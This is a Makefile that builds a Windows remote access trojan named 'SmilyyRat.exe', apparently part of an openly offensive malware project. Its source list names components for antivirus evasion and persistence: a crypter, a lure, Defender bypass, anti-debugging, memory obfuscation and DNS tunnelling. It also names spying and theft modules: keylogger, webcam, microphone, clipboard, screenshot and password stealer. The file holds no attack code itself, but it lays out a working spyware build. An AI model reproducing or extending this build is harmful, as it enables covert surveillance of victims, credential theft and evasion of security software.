# RAT Project Makefile — Windows native build (MinGW-w64)
CXX = g++
CC  = gcc

CXXFLAGS = -O2 -static -mwindows -std=c++17 -D_WIN32_WINNT=0x0601 -DWIN32_LEAN_AND_MEAN

LIBS = -lgdi32 -luser32 -lkernel32 -ladvapi32 -lshell32 -lws2_32 -lpsapi \
       -lole32 -loleaut32 -luuid -liphlpapi -lntdll -lshlwapi -lsetupapi \
       -lwinhttp -lwininet -lcrypt32 -lsecur32 -lwsock32 -lcomctl32 -lbcrypt \
       -lmfplat -lmfreadwrite -lmfuuid -lwindowscodecs -lstrmiids \
       -lwlanapi -lcredui -lmf

TARGET = SmilyyRat.exe

SRCS = src/core/main.cpp \
       src/core/rat_engine.cpp \
       src/crypter/crypter.cpp \
       src/lure/restart_wizard.cpp \
       src/network/connection.cpp \
       src/network/encryption.cpp \
       src/network/dns_tunnel.cpp \
       src/network/proxy.cpp \
       src/stealth/persistence.cpp \
       src/stealth/anti_debug.cpp \
       src/stealth/defender_bypass.cpp \
       src/stealth/hook_detection.cpp \
       src/stealth/memory_obfuscation.cpp \
       src/commands/command_handler.cpp \
       src/commands/file_commands.cpp \
       src/commands/system_commands.cpp \
       src/commands/shell_commands.cpp \
       src/modules/keylogger.cpp \
       src/modules/screenshot.cpp \
       src/modules/webcam.cpp \
       src/modules/microphone.cpp \
       src/modules/remote_desktop.cpp \
       src/modules/clipboard.cpp \
       src/modules/file_search.cpp \
       src/modules/password_stealer.cpp \
       src/modules/network_scanner.cpp \
       src/utils/logger.cpp \
       src/utils/file_utils.cpp \
       src/utils/string_utils.cpp \
       src/utils/registry_utils.cpp

OBJS = $(SRCS:.cpp=.o) src/modules/sqlite3.o

all: $(TARGET)

$(TARGET): $(OBJS)
	$(CXX) $(CXXFLAGS) -o $@ $^ $(LIBS)

%.o: %.cpp
	$(CXX) $(CXXFLAGS) -c $< -o $@

src/modules/sqlite3.o: src/modules/sqlite3.c
	$(CC) -O2 -c $< -o $@ -DSQLITE_OMIT_LOAD_EXTENSION -DSQLITE_THREADSAFE=0 -DSQLITE_OMIT_DEPRECATED -DSQLITE_DQS=0

clean:
	del /Q src\core\*.o src\crypter\*.o src\lure\*.o src\network\*.o src\stealth\*.o src\commands\*.o src\modules\*.o src\utils\*.o $(TARGET) 2>nul

rebuild: clean all

.PHONY: all clean rebuild